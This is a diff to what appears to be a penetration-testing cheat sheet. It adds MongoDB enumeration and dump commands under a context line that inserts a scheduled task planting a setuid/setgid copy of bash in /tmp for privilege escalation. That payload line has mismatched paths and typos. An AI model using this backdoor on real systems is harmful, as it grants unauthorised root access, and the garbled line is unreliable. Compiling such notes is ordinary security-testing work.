@@ -415,6 +415,28 @@ mongo -p -u <userid> scheduler
 
 db.tasks.insert({"cmd":"/bin/cp /bin/bash /tmp/tom; /bin/chown <USERAME>:admin /tmp/hackedbash; chmodg+s /tmp/hackedbash; chmod u+s /tmp/hackedbash"});
 ```
+
+### [Accessing Mongo]
+`mongo`
+
+Showing Databases:
+`show dbs`
+
+Access a database
+`use dbname`
+
+Show database tables
+`show collections`
+
+Retrieve table data
+`db.tablename.find()`
+
+dump table data using mongodump
+`mongodump => dumps data to dump/`
+
+You can prettify bson binary data using bsondump
+`bsondump dump/path/tabledata.bson=> prettify bson dumps`
+
 ### [Memcached]
 https://www.hackingarticles.in/penetration-testing-on-memcached-server/  
 https://lzone.de/cheat-sheet/memcached  
